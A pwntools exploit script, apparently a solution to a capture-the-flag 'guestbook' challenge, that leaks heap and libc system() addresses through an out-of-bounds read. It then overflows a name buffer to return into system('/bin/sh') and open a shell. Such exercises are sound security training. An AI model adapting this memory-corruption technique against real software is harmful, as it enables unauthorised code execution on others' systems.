import pwn as p

target = p.process('./guestbook')
# p.gdb.attach(target, gdbscript='b *main+471')

print(target.recv().decode('utf8'))

for i in range(4):
    target.sendline(f'name{i}')


target.sendline('1')  # go to readName
print(target.recvuntil('Which entry do you want to view?\n>>>').decode('utf8'))

target.sendline('6')  # display system_ptr

read_raw = target.recv(24)
print(read_raw)
heap_leak = p.u32(read_raw[0:4])
system_ptr_leak = p.u32(read_raw[20:24])

print('heap_leak:', hex(heap_leak))
print('system_ptr:', hex(system_ptr_leak))

# Now that we have everything, lets pop a shell
print(target.recvuntil('3. Quit\n>>'))

target.sendline('2')  # overwrite name
target.sendline('0')  # we overwrite the entry corresponding to the heap leak above

payload = b'\x30' * 4 + b'\x00'  # the name: 0000 ending with a null byte
payload += b'\x31' * 0x5f  # padding -> the buffer is now full, we will overwrite other values from now on
payload += p.p32(0x0)  # entry_to_change
payload += b'\x32' * 4  # selected_option
payload += p.p32(heap_leak)  # names
payload += b'\x33' * 0x2c  # padding until we get to the return pointer
payload += p.p32(system_ptr_leak)  # return to system
payload += b'\x34' * 4  # some bit of padding (I think it is the next return address, but we don't really care about it)
payload += p.p32(system_ptr_leak + 0x14cb22)  # address of /bin/sh in libc

target.sendline(payload)

# you have to type '3' to exit main method so we can trigger our ret exploit

target.interactive()
